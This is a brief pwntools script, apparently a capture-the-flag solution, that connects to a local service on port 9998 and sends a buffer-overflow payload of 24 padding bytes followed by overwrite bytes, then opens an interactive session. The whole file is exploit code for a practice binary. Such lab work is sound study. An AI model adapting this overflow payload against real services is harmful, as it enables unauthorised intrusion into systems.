
from pwn import *

# p=process("./eh")
p=remote('localhost',9998)
context.terminal=['gnome-terminal','-x','sh','-c']
# p=gdb.debug('./eh')
# p.recvuntil("\n")
p.send(b'AAAAAAAAAAAAAAAAAAAAAAAA\x21\x00\x00\x00\x00\x00\x00\x00\x60')
p.interactive()
